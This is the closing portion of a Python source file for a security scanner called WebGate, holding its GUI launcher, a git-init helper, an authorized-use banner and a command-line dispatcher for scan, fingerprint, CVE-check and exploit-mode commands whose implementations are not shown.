    root = tk.Tk()
    root.withdraw()         # hide root — splash is a Toplevel
    root.update_idletasks() # process pending events (needed for Toplevel)

    def _show_main():
        """Called by SplashScreen after its animation completes."""
        app = SecurityScannerGUI(root=root, prefill=domain)
        app._fade_in_root(0.0)

    SplashScreen(root, _show_main)
    root.mainloop()

def _safe_alpha(widget, val):
    """Set window alpha, silently ignore if not supported (Wayland)."""
    try:
        widget.attributes("-alpha", float(val))
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════
def _ensure_git_repo():
    if os.path.exists(os.path.join(_SCRIPT_DIR, ".git")):
        return
    try:
        subprocess.run(["git", "init", _SCRIPT_DIR], capture_output=True)
        gi = os.path.join(_SCRIPT_DIR, ".gitignore")
        if not os.path.exists(gi):
            with open(gi, "w") as f:
                f.write("# WebGate auto-generated\n*.pyc\n__pycache__/\n"
                        "settings.json\naudit_*.txt\n*.wav\n.env\n")
    except Exception:
        pass

def main():
    _init_sound()
    init_cve_db()

    if sys.stdout.isatty():
        Y = '\033[33m'; RST = '\033[0m'
        print(f"\n  {Y}{'─'*62}{RST}")
        print(f"  {Y}[!] WebGate FW3.7 — for AUTHORIZED security testing only.{RST}")
        print(f"  {Y}     Only scan systems you own or have written permission to test.{RST}")
        print(f"  {Y}{'─'*62}{RST}\n")

    p = argparse.ArgumentParser(prog="webgate", add_help=False)
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--gui",      action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--init-db",  action="store_true")
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("command", nargs="?", default="")
    p.add_argument("target", nargs="?", default="")
    args = p.parse_args()

    if args.no_color: C.disable()
    if args.init_db:
        init_cve_db()
        print(f"CVE database initialized: {get_all_cve_count()} entries")
        return
    if args.help:
        print(BANNER)
        print("  python webgate.py                    →  interactive CLI shell")
        print("  python webgate.py -d domain          →  quick surface scan")
        print("  python webgate.py deep domain        →  surface + deep scan")
        print("  python webgate.py full domain        →  complete scan (all phases)")
        print("  python webgate.py agent              →  scan local network")
        print("  python webgate.py exploit domain     →  exploit mode (scope required)")
        print("  python webgate.py finger domain      →  fingerprint device/OS/CMS")
        print("  python webgate.py verify domain      →  verify CVEs on open ports")
        print("  python webgate.py --gui              →  launch GUI (desktop)")
        print("  python webgate.py --gui -d domain    →  GUI with prefill")
        print()
        return
    if args.gui:
        launch_gui(domain=args.domain); return

    cli = CLIInterface()

    # Handle direct commands
    cmd = args.command.lower() if args.command else ""
    target = args.target or args.domain

    if cmd == "agent":
        cli.agent_mode()
    elif cmd == "exploit" and target:
        cli.exploit_mode(target)
    elif cmd == "deep" and target:
        cli.quick(target, deep=True)
    elif cmd == "full" and target:
        cli.full_scan(target)
    elif cmd == "finger" and target:
        cli.fingerprint(target)
    elif cmd == "verify" and target:
        cli.verify_cve(target)
    elif cmd == "tools":
        cli._show_tools()
    elif args.domain:
        cli.quick(args.domain)
    elif cmd and cmd not in ("", "agent"):
        # Treat command as domain if it looks like one
        cli.quick(cmd)
    else:
        cli.shell()

if __name__ == "__main__":
    main()
